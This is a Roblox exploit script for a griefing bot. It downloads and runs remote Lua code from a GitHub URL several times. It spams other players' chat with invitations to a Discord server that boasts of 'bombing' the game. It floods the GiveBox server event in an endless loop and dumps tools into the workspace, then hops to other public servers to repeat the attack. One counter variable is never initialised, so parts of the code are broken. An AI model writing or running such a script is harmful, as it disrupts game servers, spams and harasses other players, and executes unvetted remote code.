loadstring(game:HttpGet("https://raw.githubusercontent.com/v9h/dhrpvc/main/anticrash.lua", true))()
wait(6)
loadstring(game:HttpGet("https://raw.githubusercontent.com/v9h/dhrpvc/main/anticrash.lua", true))()

local function ServerHop()
    function shop()
        pcall(function()
            local Servers =
            game.HttpService:JSONDecode(
            game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")
        )
            while wait() do
                v = Servers.data[math.random(#Servers.data)]
                if v.playing < v.maxPlayers - 2 and v.id ~= game.JobId then
                    game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, v.id)
                    break
                end
            end
        end)
    end


local function hop()
        shop()
        while wait() do
            pcall(shop)
        end
    end
    hop()
end

local messages = {
   "join .gg/ritual for the script",
   "join .gg/ritual if ur cool",
   ".gg/ritual is bombing ts now hahahahaha",
   "come join .gg/ritual if ur cool liek that ahahahahah",
   "ciel was here yoo",
   "lance was here 🤑🤑🤯",
   ".gg/ritual .gg/ritual .gg/ritual",
   "no other bot can compete, join .gg/ritual"
}

local function Chat(msg)
    wait(0.2)
    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
end

coroutine.wrap(function()
    while true do
        Chat(messages[math.random(1, #messages)])
        wait(0.45)
    end
end)()

spawn(
    function()
        while true do
            wait(0.5)
            numb = numb + 1
            if numb == 212 then
                game.Players.LocalPlayer:Kick("Serverhopping")
                wait(5)
                pcall(hop)
            end
        end
    end
)

tweenService, tweenInfo = game:GetService("TweenService"), TweenInfo.new(0, Enum.EasingStyle.Linear)
tweenService:Create(game:GetService("Players")["LocalPlayer"].Character.HumanoidRootPart, tweenInfo, {CFrame = CFrame.new(-3.11554217, 11.9734716, 64.109848, 0.976845205, -7.24433491e-08, 0.213947371, 6.5722098e-08, 1, 3.8528313e-08, -0.213947371, -2.35751276e-08, 0.976845205)}):Play()
wait(0.2)
ply = game.Players.LocalPlayer.Character.HumanoidRootPart
ply.Anchored = true
wait(0.1)

loadstring(game:HttpGet("https://raw.githubusercontent.com/v9h/dhrpvc/main/anticrash.lua", true))()

task.spawn(
    function()
        while true do
            wait()
        for _, x in next, game.Players.LocalPlayer.Backpack:GetChildren() do
            if x:IsA("Tool") then
                x.Parent = game.Players.LocalPlayer.Character
                x.Parent = workspace
            end
        end
        game.ReplicatedStorage.GiveBox:FireServer()
        game.ReplicatedStorage.GiveBox:FireServer()
        game.ReplicatedStorage.GiveBox:FireServer()
        game.ReplicatedStorage.GiveBox:FireServer()
        game.ReplicatedStorage.GiveBox:FireServer()
        game.ReplicatedStorage.GiveBox:FireServer()
        game.ReplicatedStorage.GiveBox:FireServer()
        game.ReplicatedStorage.GiveBox:FireServer()
        game.ReplicatedStorage.GiveBox:FireServer()
        game.ReplicatedStorage.GiveBox:FireServer()
    end
end
)

wait(30)
ServerHop()
